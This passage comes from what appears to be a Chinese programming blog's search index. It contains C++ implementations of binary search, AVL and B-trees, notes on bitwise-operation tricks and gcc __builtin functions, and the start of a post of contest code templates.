\u0026amp;target); Error_code remove_root(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root); }; template \u0026lt;class Record\u0026gt; Binary_node\u0026lt;Record\u0026gt; *Search_tree\u0026lt;Record\u0026gt;::search_for_node( Binary_node\u0026lt;Record\u0026gt;* sub_root, const Record \u0026amp;target) const { if (!sub_root || sub_root-\u0026gt;data == target) return sub_root; else if (sub_root-\u0026gt;data \u0026lt;target) return search_for_node(sub_root-\u0026gt;right, target); else return search_for_node(sub_root-\u0026gt;left, target); } template \u0026lt;class Record\u0026gt; Error_code Search_tree\u0026lt;Record\u0026gt;::search_and_insert( Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root, const Record \u0026amp;new_data) { if (!sub_root) { sub_root = new Binary_node\u0026lt;Record\u0026gt;(new_data); return success; } else if (new_data \u0026lt; sub_root-\u0026gt;data) return search_and_insert(sub_root-\u0026gt;left, new_data); else if (new_data\u0026gt; sub_root-\u0026gt;data) return search_and_insert(sub_root-\u0026gt;right, new_data); else return duplicate_error; } template \u0026lt;class Record\u0026gt; Error_code Search_tree\u0026lt;Record\u0026gt;::remove_root(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root) { if (!sub_root) return not_present; Binary_node\u0026lt;Record\u0026gt; *to_delete = sub_root; if (!sub_root-\u0026gt;right) sub_root = sub_root-\u0026gt;left; else if (!sub_root-\u0026gt;left) sub_root = sub_root-\u0026gt;right; else { to_delete = sub_root-\u0026gt;left; Binary_node\u0026lt;Record\u0026gt; *parent = sub_root; while (to_delete-\u0026gt;right) { parent = to_delete; to_delete = to_delete-\u0026gt;right; } sub_root-\u0026gt;data = to_delete-\u0026gt;data; if (parent == sub_root) sub_root-\u0026gt;left = to_delete-\u0026gt;left; else parent-\u0026gt;right = to_delete-\u0026gt;left; } delete to_delete; return success; } template \u0026lt;class Record\u0026gt; Error_code Search_tree\u0026lt;Record\u0026gt;::search_and_destroy( Binary_node\u0026lt;Record\u0026gt;* \u0026amp;sub_root, const Record \u0026amp;target) { if (!sub_root || sub_root-\u0026gt;data == target) return remove_root(sub_root); else if (target \u0026lt; sub_root-\u0026gt;data) return search_and_destroy(sub_root-\u0026gt;left, target); else return search_and_destroy(sub_root-\u0026gt;right, target); } template \u0026lt;class Record\u0026gt; struct AVL_node: public Binary_node\u0026lt;Record\u0026gt; { using Binary_node\u0026lt;Record\u0026gt;::left; using Binary_node\u0026lt;Record\u0026gt;::right; using Binary_node\u0026lt;Record\u0026gt;::data; Balance_factor balance; AVL_node() {left = right = NULL; balance = equal_height;}; AVL_node(const Record \u0026amp;x) { data = x; left = right = NULL; balance = equal_height; }; void set_balance(Balance_factor b) {balance = b;}; Balance_factor get_balance() const {return balance;}; }; template \u0026lt;class Record\u0026gt; class AVL_tree: public Search_tree\u0026lt;Record\u0026gt; { public: Error_code insert(const Record \u0026amp;new_data) { bool taller; return avl_insert(root, new_data, taller); } Error_code remove(Record \u0026amp;new_data) { bool shorter = true; return avl_remove(root, new_data, shorter); }; private: using Binary_tree\u0026lt;Record\u0026gt;::root; Error_code avl_insert(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root, const Record \u0026amp;new_data, bool \u0026amp;taller); void rotate_left(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root); void rotate_right(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root); void right_balance(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root); void left_balance(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root); Error_code avl_remove(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root, Record \u0026amp;new_data, bool \u0026amp;shorter); bool right_balance2(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root); bool left_balance2(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root); }; template \u0026lt;class Record\u0026gt; Error_code AVL_tree\u0026lt;Record\u0026gt;::avl_insert(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root, const Record \u0026amp;new_data, bool \u0026amp;taller) { Error_code result = success; if (!sub_root) { sub_root = new AVL_node\u0026lt;Record\u0026gt;(new_data); taller = true; } else if (new_data == sub_root-\u0026gt;data) { result = duplicate_error; taller = false; } else if (new_data \u0026lt; sub_root-\u0026gt;data) { result = avl_insert(sub_root-\u0026gt;left, new_data, taller); if (taller) switch (sub_root-\u0026gt;get_balance()) { case left_higher: left_balance(sub_root); taller = false; break; case equal_height: sub_root-\u0026gt;set_balance(left_higher); break; case right_higher: sub_root-\u0026gt;set_balance(equal_height); taller = false; break; } } else { result = avl_insert(sub_root-\u0026gt;right, new_data, taller); if (taller) switch (sub_root-\u0026gt;get_balance()) { case left_higher: sub_root-\u0026gt;set_balance(equal_height); taller = false; break; case equal_height: sub_root-\u0026gt;set_balance(right_higher); break; case right_higher: right_balance(sub_root); taller = false; break; } } return result; } template \u0026lt;class Record\u0026gt; void AVL_tree\u0026lt;Record\u0026gt;::rotate_left(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root) { if (!sub_root || !sub_root-\u0026gt;right) cout \u0026lt;\u0026lt;\u0026#34;WARNING: program error detected in rotate left\u0026#34; \u0026lt;\u0026lt; endl; else { Binary_node\u0026lt;Record\u0026gt; *right_tree = sub_root-\u0026gt;right; sub_root-\u0026gt;right = right_tree-\u0026gt;left; right_tree-\u0026gt;left = sub_root; sub_root = right_tree; } } template \u0026lt;class Record\u0026gt; void AVL_tree\u0026lt;Record\u0026gt; :: rotate_right(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root) { if (!sub_root || !sub_root-\u0026gt;left) cout \u0026lt;\u0026lt;\u0026#34;WARNING: program error detected in rotate right\u0026#34; \u0026lt;\u0026lt; endl; else { Binary_node\u0026lt;Record\u0026gt; *left_tree = sub_root-\u0026gt;left; sub_root-\u0026gt;left = left_tree-\u0026gt;right; left_tree-\u0026gt;right = sub_root; sub_root = left_tree; } } template \u0026lt;class Record\u0026gt; void AVL_tree\u0026lt;Record\u0026gt;::right_balance(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root) { Binary_node\u0026lt;Record\u0026gt; * \u0026amp;right_tree = sub_root-\u0026gt;right; switch (right_tree-\u0026gt;get_balance()) { case right_higher: sub_root-\u0026gt;set_balance(equal_height); right_tree-\u0026gt;set_balance(equal_height); rotate_left(sub_root); break; case equal_height: cout \u0026lt;\u0026lt;\u0026#34;WARNING: program error in right balance\u0026#34; \u0026lt;\u0026lt; endl; case left_higher: Binary_node\u0026lt;Record\u0026gt; *sub_tree = right_tree-\u0026gt;left; switch (sub_tree-\u0026gt;get_balance()) { case equal_height: sub_root-\u0026gt;set_balance(equal_height); right_tree-\u0026gt;set_balance(equal_height); break; case left_higher: sub_root-\u0026gt;set_balance(equal_height); right_tree-\u0026gt;set_balance(right_higher); break; case right_higher: sub_root-\u0026gt;set_balance(left_higher); right_tree-\u0026gt;set_balance(equal_height); break; } sub_tree-\u0026gt;set_balance(equal_height); rotate_right(right_tree); rotate_left(sub_root); break; } } template \u0026lt;class Record\u0026gt; void AVL_tree\u0026lt;Record\u0026gt;::left_balance(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root) { Binary_node\u0026lt;Record\u0026gt; * \u0026amp;left_tree = sub_root-\u0026gt;left; switch (left_tree-\u0026gt;get_balance()) { case left_higher: sub_root-\u0026gt;set_balance(equal_height); left_tree-\u0026gt;set_balance(equal_height); rotate_right(sub_root); break; case equal_height: cout \u0026lt;\u0026lt;\u0026#34;WARNING: program error in right balance\u0026#34; \u0026lt;\u0026lt; endl; case right_higher: Binary_node\u0026lt;Record\u0026gt; *sub_tree = left_tree-\u0026gt;right; switch (sub_tree-\u0026gt;get_balance()) { case equal_height: sub_root-\u0026gt;set_balance(equal_height); left_tree-\u0026gt;set_balance(equal_height); break; case right_higher: sub_root-\u0026gt;set_balance(equal_height); left_tree-\u0026gt;set_balance(left_higher); break; case left_higher: sub_root-\u0026gt;set_balance(right_higher); left_tree-\u0026gt;set_balance(equal_height); break; } sub_tree-\u0026gt;set_balance(equal_height); rotate_left(left_tree); rotate_right(sub_root); break; } } template \u0026lt;class Record\u0026gt; Error_code AVL_tree\u0026lt;Record\u0026gt;::avl_remove(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root, Record \u0026amp;new_data, bool \u0026amp;shorter) { Error_code result = success; Record sub_record; if (!sub_root) { shorter = false; return not_present; } else if (new_data == sub_root-\u0026gt;data) { Binary_node\u0026lt;Record\u0026gt; *to_delete = sub_root; if (!sub_root-\u0026gt;right) { sub_root = sub_root-\u0026gt;left; shorter = true; delete to_delete; return success; } else if (!sub_root-\u0026gt;left) { sub_root = sub_root-\u0026gt;right; shorter = true; delete to_delete; return success; } else { to_delete = sub_root-\u0026gt;left; Binary_node\u0026lt;Record\u0026gt; *parent = sub_root; while (to_delete-\u0026gt;right) { parent = to_delete; to_delete = to_delete-\u0026gt;right; } new_data = to_delete-\u0026gt;data; sub_record = new_data; } } if (new_data \u0026lt; sub_root-\u0026gt;data) { result = avl_remove(sub_root-\u0026gt;left, new_data, shorter); if (sub_record.the_key()) sub_root-\u0026gt;data = sub_record; if (shorter) switch (sub_root-\u0026gt;get_balance()) { case left_higher: sub_root-\u0026gt;set_balance(equal_height); break; case equal_height: sub_root-\u0026gt;set_balance(right_higher); shorter = false; break; case right_higher: shorter = right_balance2(sub_root); break; } } if (new_data\u0026gt; sub_root-\u0026gt;data) { result = avl_remove(sub_root-\u0026gt;right, new_data, shorter); if (sub_record.the_key()) sub_root-\u0026gt;data = sub_record; if (shorter) switch (sub_root-\u0026gt;get_balance()) { case left_higher: shorter = left_balance2(sub_root); break; case equal_height: sub_root-\u0026gt;set_balance(left_higher); shorter = false; break; case right_higher: sub_root-\u0026gt;set_balance(equal_height); break; } } return result; } template \u0026lt;class Record\u0026gt; bool AVL_tree\u0026lt;Record\u0026gt;::right_balance2(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root) { bool shorter; Binary_node\u0026lt;Record\u0026gt; * \u0026amp;right_tree = sub_root-\u0026gt;right; switch (right_tree-\u0026gt;get_balance()) { case right_higher: sub_root-\u0026gt;set_balance(equal_height); right_tree-\u0026gt;set_balance(equal_height); rotate_left(sub_root); shorter = true; break; case equal_height: right_tree-\u0026gt;set_balance(left_higher); rotate_left(sub_root); shorter = false; break; case left_higher: Binary_node\u0026lt;Record\u0026gt; *sub_tree = right_tree-\u0026gt;left; switch (sub_tree-\u0026gt;get_balance()) { case equal_height: sub_root-\u0026gt;set_balance(equal_height); right_tree-\u0026gt;set_balance(equal_height); break; case left_higher: sub_root-\u0026gt;set_balance(equal_height); right_tree-\u0026gt;set_balance(right_higher); break; case right_higher: sub_root-\u0026gt;set_balance(left_higher); right_tree-\u0026gt;set_balance(equal_height); break; } sub_tree-\u0026gt;set_balance(equal_height); rotate_right(right_tree); rotate_left(sub_root); shorter = true; break; } return shorter; } template \u0026lt;class Record\u0026gt; bool AVL_tree\u0026lt;Record\u0026gt;::left_balance2(Binary_node\u0026lt;Record\u0026gt; * \u0026amp;sub_root) { bool shorter; Binary_node\u0026lt;Record\u0026gt; * \u0026amp;left_tree = sub_root-\u0026gt;left; switch (left_tree-\u0026gt;get_balance()) { case left_higher: sub_root-\u0026gt;set_balance(equal_height); left_tree-\u0026gt;set_balance(equal_height); rotate_right(sub_root); shorter = true; break; case equal_height: left_tree-\u0026gt;set_balance(right_higher); rotate_right(sub_root); shorter = false; break; case right_higher: Binary_node\u0026lt;Record\u0026gt; *sub_tree = left_tree-\u0026gt;right; switch (sub_tree-\u0026gt;get_balance()) { case equal_height: sub_root-\u0026gt;set_balance(equal_height); left_tree-\u0026gt;set_balance(equal_height); break; case right_higher: sub_root-\u0026gt;set_balance(equal_height); left_tree-\u0026gt;set_balance(left_higher); break; case left_higher: sub_root-\u0026gt;set_balance(right_higher); left_tree-\u0026gt;set_balance(equal_height); break; } sub_tree-\u0026gt;set_balance(equal_height); rotate_left(left_tree); rotate_right(sub_root); shorter = true; break; } return shorter; } template \u0026lt;class Record\u0026gt; void print(Record \u0026amp;x) { cout \u0026lt;\u0026lt; x \u0026lt;\u0026lt;\u0026#34; \u0026#34;; } typedef char Record; int main() { AVL_tree\u0026lt;Record\u0026gt; mytree; mytree.insert(\u0026#39;A\u0026#39;); mytree.insert(\u0026#39;V\u0026#39;); mytree.insert(\u0026#39;L\u0026#39;); mytree.insert(\u0026#39;T\u0026#39;); mytree.insert(\u0026#39;R\u0026#39;); mytree.insert(\u0026#39;E\u0026#39;); mytree.insert(\u0026#39;I\u0026#39;); mytree.insert(\u0026#39;S\u0026#39;); mytree.insert(\u0026#39;O\u0026#39;); mytree.insert(\u0026#39;K\u0026#39;); cout \u0026lt;\u0026lt;\u0026#34;Preorder:\u0026#34; \u0026lt;\u0026lt; endl; mytree.preorder(print); cout \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt;\u0026#34;Inorder:\u0026#34; \u0026lt;\u0026lt; endl; mytree.inorder(print); cout \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt;\u0026#34;Postorder:\u0026#34; \u0026lt;\u0026lt; endl; mytree.postorder(print); cout \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; endl; cin.get(); return 0; } B 树 # 这里不赘述具体原理了，只记录一下代码。\n说起来，B 树又叫 B-树，然而中间并不是减号而是连接符；同时，数据库索引使用的 B+ 树中间的 + 号又真的是加号……\n代码 # #include \u0026lt;iostream\u0026gt; using namespace std; template \u0026lt;class Record, int order\u0026gt; struct B_node { int cnt; Record data[order-1]; B_node\u0026lt;Record, order\u0026gt; *branch[order]; B_node() {cnt = 0;} }; enum Error_code {not_present, duplicate_error, overflow, success}; template\u0026lt;class Record,int order\u0026gt; class B_tree { public: B_tree() {root = nullptr;} Error_code search_tree(Record \u0026amp;target) { return recursive_search_tree(root, target); } Error_code insert(const Record \u0026amp;new_entry); Error_code remove(const Record \u0026amp;target); private: B_node\u0026lt;Record, order\u0026gt; *root; Error_code recursive_search_tree(B_node\u0026lt;Record, order\u0026gt; *current, Record \u0026amp;target); Error_code search_node(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;target, int \u0026amp;pos); Error_code push_down(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;new_entry, Record \u0026amp;median, B_node\u0026lt;Record, order\u0026gt; * \u0026amp;right_branch); void push_in(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;entry, B_node\u0026lt;Record, order\u0026gt; *right_branch, int pos); void split_node(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;extra_entry, B_node\u0026lt;Record, order\u0026gt; *extra_branch, int pos, B_node\u0026lt;Record, order\u0026gt; * \u0026amp;right_half, Record \u0026amp;median); Error_code recursive_remove(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;target); void remove_data(B_node\u0026lt;Record, order\u0026gt; *current, int pos) { for (int i = pos; i \u0026lt; current-\u0026gt;cnt-1; ++i) current-\u0026gt;data[i] = current-\u0026gt;data[i+1]; --current-\u0026gt;cnt; } void copy_in_predecessor(B_node\u0026lt;Record, order\u0026gt; *current, int pos) { B_node\u0026lt;Record, order\u0026gt; *leaf = current-\u0026gt;branch[pos]; while (leaf-\u0026gt;branch[leaf-\u0026gt;cnt]) leaf = leaf-\u0026gt;branch[leaf-\u0026gt;cnt]; current-\u0026gt;data[pos] = leaf-\u0026gt;data[leaf-\u0026gt;cnt-1]; } void restore(B_node\u0026lt;Record, order\u0026gt; *current, int pos); void move_left(B_node\u0026lt;Record, order\u0026gt; *current, int pos); void move_right(B_node\u0026lt;Record, order\u0026gt; *current, int pos); void combine(B_node\u0026lt;Record, order\u0026gt; *current, int pos); }; template\u0026lt;class Record, int order\u0026gt; Error_code B_tree\u0026lt;Record, order\u0026gt;::recursive_search_tree(B_node\u0026lt;Record, order\u0026gt; *current, Record \u0026amp;target) { Error_code result = not_present; int pos; if (current) { result = search_node(current, target, pos); if (result == not_present) result = recursive_search_tree(current-\u0026gt;branch[pos], target); else target = current-\u0026gt;data[pos]; } return result; } template\u0026lt;class Record, int order\u0026gt; Error_code B_tree\u0026lt;Record, order\u0026gt;::search_node(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;target, int \u0026amp;pos) { pos = 0; while (pos \u0026lt; current-\u0026gt;cnt \u0026amp;\u0026amp; target \u0026gt; current-\u0026gt;data[pos]) ++pos; if (pos \u0026lt; current-\u0026gt;cnt \u0026amp;\u0026amp; target == current-\u0026gt;data[pos]) return success; else return not_present; } template\u0026lt;class Record, int order\u0026gt; Error_code B_tree\u0026lt;Record, order\u0026gt;::insert(const Record \u0026amp;new_entry) { Record median; B_node\u0026lt;Record, order\u0026gt; *right_branch, *new_root; Error_code result = push_down(root, new_entry, median, right_branch); if (result == overflow) { new_root = new B_node\u0026lt;Record, order\u0026gt;; new_root-\u0026gt;cnt = 1; new_root-\u0026gt;data[0] = median; new_root-\u0026gt;branch[0] = root; new_root-\u0026gt;branch[1] = right_branch; root = new_root; result = success; } return result; } template\u0026lt;class Record, int order\u0026gt; Error_code B_tree\u0026lt;Record, order\u0026gt;::push_down(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;new_entry, Record \u0026amp;median, B_node\u0026lt;Record, order\u0026gt; * \u0026amp;right_branch) { Error_code result; int pos; if (!current) { median = new_entry; right_branch = nullptr; result = overflow; } else { if (search_node(current, new_entry, pos) == success) result = duplicate_error; else { Record extra_entry; B_node\u0026lt;Record, order\u0026gt; *extra_branch; result = push_down(current-\u0026gt;branch[pos], new_entry, extra_entry, extra_branch); if (result == overflow) { if (current-\u0026gt;cnt \u0026lt;order-1) { result = success; push_in(current, extra_entry, extra_branch, pos); }else split_node(current, extra_entry, extra_branch, pos, right_branch, median); } } } return result; } template\u0026lt;class Record, int order\u0026gt; void B_tree\u0026lt;Record, order\u0026gt;::push_in(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;entry, B_node\u0026lt;Record, order\u0026gt; *right_branch, int pos) { for (int i = current-\u0026gt;cnt; i \u0026gt; pos; --i) { current-\u0026gt;data[i] = current-\u0026gt;data[i-1]; current-\u0026gt;branch[i+1] = current-\u0026gt;branch[i]; } current-\u0026gt;data[pos] = entry; current-\u0026gt;branch[pos+1] = right_branch; ++current-\u0026gt;cnt; } template\u0026lt;class Record, int order\u0026gt; void B_tree\u0026lt;Record, order\u0026gt;::split_node(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;extra_entry, B_node\u0026lt;Record, order\u0026gt; *extra_branch, int pos, B_node\u0026lt;Record, order\u0026gt; * \u0026amp;right_half, Record \u0026amp;median) { right_half = new B_node\u0026lt;Record, order\u0026gt;; int mid = order\u0026gt;\u0026gt;1; if (pos \u0026lt;= mid) { for (int i = mid; i \u0026lt; order-1; ++i) { right_half-\u0026gt;data[i-mid] = current-\u0026gt;data[i]; right_half-\u0026gt;branch[i+1-mid] = current-\u0026gt;branch[i+1]; } current-\u0026gt;cnt = mid; right_half-\u0026gt;cnt = order - mid - 1; push_in(current, extra_entry, extra_branch, pos); } else { ++mid; for (int i = mid; i \u0026lt; order-1; ++i) { right_half-\u0026gt;data[i-mid] = current-\u0026gt;data[i]; right_half-\u0026gt;branch[i+1-mid] = current-\u0026gt;branch[i+1]; } current-\u0026gt;cnt = mid; right_half-\u0026gt;cnt = order - 1 - mid; push_in(right_half, extra_entry, extra_branch, pos-mid); } median = current-\u0026gt;data[current-\u0026gt;cnt-1]; right_half-\u0026gt;branch[0] = current-\u0026gt;branch[current-\u0026gt;cnt]; --current-\u0026gt;cnt; } template \u0026lt;class Record, int order\u0026gt; Error_code B_tree\u0026lt;Record, order\u0026gt;::remove(const Record \u0026amp;target) { Error_code result; result = recursive_remove(root, target); if (root \u0026amp;\u0026amp; !root-\u0026gt;cnt) { B_node\u0026lt;Record, order\u0026gt; *old_root = root; root = root-\u0026gt;branch[0]; delete old_root; } return result; } template \u0026lt;class Record, int order\u0026gt; Error_code B_tree\u0026lt;Record, order\u0026gt;::recursive_remove(B_node\u0026lt;Record, order\u0026gt; *current, const Record \u0026amp;target) { Error_code result; int pos; if (!current) result = not_present; else { if (search_node(current, target, pos) == success) { result = success; if (current-\u0026gt;branch[pos]) { copy_in_predecessor(current, pos); recursive_remove(current-\u0026gt;branch[pos], current-\u0026gt;data[pos]); } else remove_data(current, pos); }else result = recursive_remove(current-\u0026gt;branch[pos], target); if (current-\u0026gt;branch[pos]) if (current-\u0026gt;branch[pos]-\u0026gt;cnt \u0026lt;((order-1)\u0026gt;\u0026gt;1)) restore(current, pos); } return result; } template \u0026lt;class Record, int order\u0026gt; void B_tree\u0026lt;Record, order\u0026gt;::restore(B_node\u0026lt;Record, order\u0026gt; *current, int pos) { if (pos == current-\u0026gt;cnt) if (current-\u0026gt;branch[pos-1]-\u0026gt;cnt \u0026gt; ((order-1)\u0026gt;\u0026gt;1)) move_right(current, pos-1); else combine(current, pos); else if (!pos) if (current-\u0026gt;branch[1]-\u0026gt;cnt \u0026gt; ((order-1)\u0026gt;\u0026gt;1)) move_left(current, 1); else combine(current, 1); else if (current-\u0026gt;branch[pos-1]-\u0026gt;cnt \u0026gt; ((order-1)\u0026gt;\u0026gt;1)) move_right(current, pos-1); else if (current-\u0026gt;branch[pos+1]-\u0026gt;cnt \u0026gt; ((order-1)\u0026gt;\u0026gt;1)) move_left(current, pos+1); else combine(current, pos); } template \u0026lt;class Record, int order\u0026gt; void B_tree\u0026lt;Record, order\u0026gt;::move_left(B_node\u0026lt;Record, order\u0026gt; *current, int pos) { B_node\u0026lt;Record, order\u0026gt; *left_branch = current-\u0026gt;branch[pos-1], *right_branch = current-\u0026gt;branch[pos]; left_branch-\u0026gt;data[left_branch-\u0026gt;cnt] = current-\u0026gt;data[pos-1]; left_branch-\u0026gt;branch[++left_branch-\u0026gt;cnt] = right_branch-\u0026gt;branch[0]; current-\u0026gt;data[pos-1] = right_branch-\u0026gt;data[0]; --right_branch-\u0026gt;cnt; for (int i = 0; i \u0026lt; right_branch-\u0026gt;cnt; ++i) { right_branch-\u0026gt;data[i] = right_branch-\u0026gt;data[i+1]; right_branch-\u0026gt;branch[i] = right_branch-\u0026gt;branch[i+1]; } right_branch-\u0026gt;branch[right_branch-\u0026gt;cnt] = right_branch-\u0026gt;branch[right_branch-\u0026gt;cnt+1]; } template \u0026lt;class Record, int order\u0026gt; void B_tree\u0026lt;Record, order\u0026gt;::move_right(B_node\u0026lt;Record, order\u0026gt; *current, int pos) { B_node\u0026lt;Record, order\u0026gt; *right_branch = current-\u0026gt;branch[pos+1], *left_branch = current-\u0026gt;branch[pos]; right_branch-\u0026gt;branch[right_branch-\u0026gt;cnt+1] = right_branch-\u0026gt;branch[right_branch-\u0026gt;cnt]; for (int i = right_branch-\u0026gt;cnt; i \u0026gt; 0; --i) { right_branch-\u0026gt;data[i] = right_branch-\u0026gt;data[i-1]; right_branch-\u0026gt;branch[i] = right_branch-\u0026gt;branch[i-1]; } ++right_branch-\u0026gt;cnt; right_branch-\u0026gt;data[0] = current-\u0026gt;data[pos]; right_branch-\u0026gt;branch[0] = left_branch-\u0026gt;branch[left_branch-\u0026gt;cnt--]; current-\u0026gt;data[pos] = left_branch-\u0026gt;data[left_branch-\u0026gt;cnt]; } template \u0026lt;class Record, int order\u0026gt; void B_tree\u0026lt;Record, order\u0026gt;::combine(B_node\u0026lt;Record, order\u0026gt; *current, int pos) { int i; B_node\u0026lt;Record, order\u0026gt; *left_branch = current-\u0026gt;branch[pos-1], *right_branch = current-\u0026gt;branch[pos]; left_branch-\u0026gt;data[left_branch-\u0026gt;cnt] = current-\u0026gt;data[pos-1]; left_branch-\u0026gt;branch[++left_branch-\u0026gt;cnt] = right_branch-\u0026gt;branch[0]; for (i = 0; i \u0026lt; right_branch-\u0026gt;cnt; ++i) { left_branch-\u0026gt;data[left_branch-\u0026gt;cnt] = right_branch-\u0026gt;data[i]; left_branch-\u0026gt;branch[++left_branch-\u0026gt;cnt] = right_branch-\u0026gt;branch[i+1]; } --current-\u0026gt;cnt; for (i = pos-1; i \u0026lt; current-\u0026gt;cnt; ++i) { current-\u0026gt;data[i] = current-\u0026gt;data[i+1]; current-\u0026gt;branch[i+1] = current-\u0026gt;branch[i+2]; } delete right_branch; } int main() { B_tree\u0026lt;char, 5\u0026gt; mybtree; mybtree.insert(\u0026#39;a\u0026#39;); mybtree.insert(\u0026#39;g\u0026#39;); mybtree.insert(\u0026#39;f\u0026#39;); mybtree.insert(\u0026#39;b\u0026#39;); mybtree.insert(\u0026#39;k\u0026#39;); mybtree.insert(\u0026#39;d\u0026#39;); mybtree.insert(\u0026#39;h\u0026#39;); mybtree.insert(\u0026#39;m\u0026#39;); mybtree.insert(\u0026#39;j\u0026#39;); mybtree.insert(\u0026#39;e\u0026#39;); mybtree.insert(\u0026#39;s\u0026#39;); mybtree.insert(\u0026#39;i\u0026#39;); mybtree.insert(\u0026#39;r\u0026#39;); mybtree.insert(\u0026#39;x\u0026#39;); mybtree.insert(\u0026#39;c\u0026#39;); mybtree.insert(\u0026#39;l\u0026#39;); mybtree.insert(\u0026#39;n\u0026#39;); mybtree.insert(\u0026#39;t\u0026#39;); mybtree.insert(\u0026#39;u\u0026#39;); mybtree.insert(\u0026#39;p\u0026#39;); char target = \u0026#39;k\u0026#39;; cout \u0026lt;\u0026lt;mybtree.search_tree(target); mybtree.remove(\u0026#39;k\u0026#39;); cout \u0026lt;\u0026lt;mybtree.search_tree(target); cin.get(); return 0; } ","date":"2018-06-13","permalink":"/posts/avl-b-tree/","section":"Posts","summary":"\u003cp\u003e数据结构上机课花了点时间实现的两种相对复杂的数据结构。基本上在抄书。\u003c/p\u003e","title":"AVL 树和 B 树"},{"content":"实训准备的第二弹。\n简介 # 整理了一些和位运算相关的内容，主要分为以下几个部分：\n集合的整数表示 位运算的常见技巧和常用公式 gcc 中 __builtin 系列函数及 C++ 中 bitset 类的简介 集合的整数表示 # 以下内容摘自挑战程序设计竞赛：\n在程序中表示集合的方法有很多种，当元素数比较少时，像这样用二进制码来表示比较方便。集合 ${0,1,\u0026hellip;,n-1}$ 的子集 S 可以用如下方式编码成整数。\n$$ f(S)=\\sum\\limits_{i\\in{S}}2^i $$\n像这样表示之后，一些集合运算可以对应地写成如下方式。\n空集：0 只含有第 i 个元素的集合：1\u0026lt;\u0026lt;i 含有全部 n 个元素的集合：(1\u0026lt;\u0026lt;n)-1 判断第 i 个元素是否属于集合 S：if (S\u0026gt;\u0026gt;i \u0026amp; 1) 向集合中加入第 i 个元素：S | 1\u0026lt;\u0026lt;i 从集合中去除第 i 个元素：S \u0026amp; ~(1\u0026lt;\u0026lt;i) 求 S 和 T 的交集、并集：S|T, S\u0026amp;T 此外, 想要将集合 ${0,1,\u0026hellip;,n-1}$ 的所有子集枚举出来的话，可以像下面这样书写：\nfor (int S = 0; S \u0026lt; (1\u0026lt;\u0026lt;n); ++S) { // 对子集的处理 } 按这个顺序循环的话，S 便会从空集开始，然后按照 {0},{1},{0,1},\u0026hellip;{0,1,\u0026hellip;,n-1} 的升序顺序枚举出来。\n更高级的内容参见挑战程序设计竞赛。 其实是懒 位运算的常见技巧和常用公式 # 如有遗漏请务必补充。\n（来自: 树状数组 lowbit）取出 “从 x 的最低位的 1 直到最后” 的值：x \u0026amp;= -x （来自: 线段树）快速求 $2x,2x+1$：x\u0026lt;\u0026lt;1, x\u0026lt;\u0026lt;1|1 （来自: 我也不知道来自哪里）把 x 最低位的 1 变成 0：x \u0026amp;= (x-1) （来自: 我也不知道来自哪里）把 x 最低位的 0 变成 1：x |= x+1 （来自: 状压 dp）判断 x 的第 i 位是不是 1：if (x \u0026amp; (1\u0026lt;\u0026lt;i)) （来自: 博弈论）异或（XOR）运算的性质：同一个数异或两次即为其自身 （来自：CSAPP）C/C++ 中对于有符号数，\u0026gt;\u0026gt; 表示算术右移；对于无符号数，\u0026gt;\u0026gt; 表示逻辑右移。对于两者而言，\u0026lt;\u0026lt; 都表示逻辑左移。 （来自: 为了偷懒不写 EOF）表示 x 不等于 -1：~x。也就是说，while(scanf(\u0026quot;%d\u0026quot;, \u0026amp;n) != EOF) 等价于 while(~scanf(\u0026quot;%d\u0026quot;, \u0026amp;n))。 由于其中原理都不难推导，这里不再赘述。\ngcc 中 __builtin 系列函数及 C++ 中 bitset 类的简介 # 这里只记录一些实训可能会用到的……\n__builtin # 以下函数都返回 int，x 都为 unsigned int（当然在函数名后加 l 或 ll 可以改为 long/long long 类型）。\n__builtin_popcount(x)：x 中 1 的个数 __builtin_ctz(x)：x 末尾 0 的个数（x 非 0） __builtin_clz(x)：x 前导 0 的个数（x 非 0） __builtin_ffs(x)：x 中最后一个为 1 的位是从后向前的第几位 __builtin_parity(x)：x 中 1 的个数模 2 的值 bitset # 本来想自己写一下，后来发现 这个博客 和 这个博客 总结得很好，就偷了个懒。\n一般来说实训当中不太会有很需要用到 __builtin 和 bitset 的题目，所以了解一下就可以了。\n","date":"2018-03-11","permalink":"/posts/bitwise-ops/","section":"Posts","summary":"\u003cp\u003e实训准备的第二弹。\u003c/p\u003e","title":"位运算用法整理"},{"content":"其实差不多就是低难度 C++ 模板集合。\n排序 # 快速排序 # void quick_sort(int s[], int l, int r) //(s[], 0, n-1) ascending order { int i, j, x; if (l \u0026lt; r) { i = l; j = r; x = s[i]; while (i \u0026lt; j) { while(i \u0026lt; j \u0026amp;\u0026amp; s[j] \u0026gt; x) j--; if(i \u0026lt; j) s[i++] = s[j]; while(i \u0026lt; j 